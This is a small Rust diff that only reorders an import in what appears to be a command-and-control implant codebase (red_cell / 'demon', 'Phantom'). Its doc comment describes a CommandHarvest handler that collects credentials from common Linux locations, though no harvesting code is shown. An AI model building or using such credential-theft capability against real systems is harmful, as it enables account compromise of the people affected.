@@ -8,9 +8,9 @@ use red_cell_common::demon::DemonCommand;
 
 use crate::error::PhantomError;
 
+use super::PhantomState;
 use super::encode::encode_harvest_entries;
 use super::types::PendingCallback;
-use super::PhantomState;
 
 /// Handle `CommandHarvest` (ID 2580): collect credentials from common Linux locations.
 ///
